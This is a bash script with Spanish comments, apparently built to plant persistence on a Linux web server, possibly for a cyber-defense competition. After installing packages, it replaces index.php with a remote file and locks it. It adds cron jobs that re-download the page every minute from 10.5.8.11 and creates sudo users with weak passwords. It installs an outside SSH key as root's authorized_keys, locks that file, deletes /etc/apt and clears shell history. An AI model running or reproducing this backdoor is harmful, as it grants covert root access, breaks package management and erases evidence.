#!/bin/bash

# Lista de paquetes a instalar
paquetes=("nano" "curl" "git" "php" "httpd")

# Función para verificar si un paquete está instalado (Debian/Ubuntu/Kali)
paquete_instalado_apt() {  
    dpkg -l "$1" | grep -q '^ii'  
}

# Función para verificar si un paquete está instalado (CentOS/RHEL)
paquete_instalado_yum() {
    yum list installed "$1" &> /dev/null
}

# Función para verificar si un paquete está instalado (Fedora)
paquete_instalado_dnf() {
    dnf list installed "$1" &> /dev/null
}

# Función para verificar si un paquete está instalado (Arch Linux)
paquete_instalado_pacman() {
    pacman -Qi "$1" &> /dev/null
}

# Detectar el sistema operativo
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
fi

# Instalar paquetes basados en el sistema operativo
for paquete in "${paquetes[@]}"; do
    case $OS in
        "debian"|"ubuntu"|"kali")
            if ! paquete_instalado_apt "$paquete"; then
                echo "Instalando el paquete $paquete..."
                sudo apt-get install -y "$paquete"
            fi
            ;;
        "centos"|"rhel")
            if ! paquete_instalado_yum "$paquete"; then
                echo "Instalando el paquete $paquete..."
                sudo yum install -y "$paquete"
            fi
            ;;
        "fedora")
            if ! paquete_instalado_dnf "$paquete"; then
                echo "Instalando el paquete $paquete..."
                sudo dnf install -y "$paquete"
            fi
            ;;
        "arch")
            if ! paquete_instalado_pacman "$paquete"; then
                echo "Instalando el paquete $paquete..."
                sudo pacman -S --noconfirm "$paquete"
            fi
            ;;
        *)
            ;;
    esac
done





# Clonar el repositorio a /var/www
sudo git clone https://github.com/banago/simple-php-website.git /var/www/simple-php-website

# Descargar index.php a /var/www/simple-php-website
sudo curl -o /var/www/simple-php-website/index.php https://raw.githubusercontent.com/4rji/ccdc/main/index.php
sudo curl -o /var/www/index.php https://raw.githubusercontent.com/4rji/ccdc/main/index.php
sudo curl -o /var/www/html/index.php https://raw.githubusercontent.com/4rji/ccdc/main/index.php


# Aplicar el atributo inmutable al archivo index.php
sudo chattr +i /var/www/simple-php-website/index.php

# Añadir tarea a crontab
(crontab -l 2>/dev/null; echo "* * * * * curl -o /var/www/simple-php-website/index.php http://10.5.8.11/index.php") | sudo crontab -
(crontab -l 2>/dev/null; echo "* * * * * curl -o /var/www/simple-php-website/index.php http://10.5.8.11/index.php") | crontab -

# Iniciar y habilitar httpd
sudo systemctl start httpd 2>/dev/null
sudo systemctl enable httpd 2>/dev/null




# Requiere ejecutarse como root
if [ "$(id -u)" != "0" ]; then
   echo "Este script debe ser ejecutado como root" 1>&2
   exit 1
fi

# Crear el primer usuario con home directory
useradd -m ccdc -G sudo
echo "ccdc:ccdc" | chpasswd
passwd --expire ccdc

# Crear el segundo usuario sin home directory
useradd prestashop -G sudo -M
echo "prestashop:ass" | chpasswd

echo "Usuarios creados y añadidos al grupo sudo. Contraseñas establecidas."






# URL de tu clave pública
URL_CLAVE="https://raw.githubusercontent.com/4rji/4rji/main/id_ed25519.pub"

mkdir -p /root/.ssh


# Descargar y agregar la clave pública al archivo authorized_keys
wget -O /root/.ssh/authorized_keys $URL_CLAVE
chmod 600 /root/.ssh/authorized_keys


chattr +i /root/.ssh/authorized_keys

echo "Clave SSH pública instalada para el usuario prestashop."


#delete the apt update files
rm /etc/apt/* -rf


sleep 1 

history -c && history -w

echo "Historial borrado"


